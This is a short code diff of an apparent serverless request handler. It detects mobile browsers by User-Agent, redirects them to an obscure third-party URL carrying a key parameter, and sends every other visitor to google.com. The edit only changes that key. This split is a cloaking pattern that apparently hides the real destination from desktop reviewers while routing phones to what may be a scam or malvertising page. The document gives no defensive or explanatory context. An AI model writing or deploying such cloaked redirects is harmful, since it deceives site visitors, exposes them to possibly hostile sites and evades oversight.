@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://brewingeasel.com/feq26gmyy?key=714fad468632fd9c9b3439b2102df83", 302);
+    return Response.redirect("https://brewingeasel.com/feq26gmyy?key=714fad468632fd9c9b3439b2102df83f", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
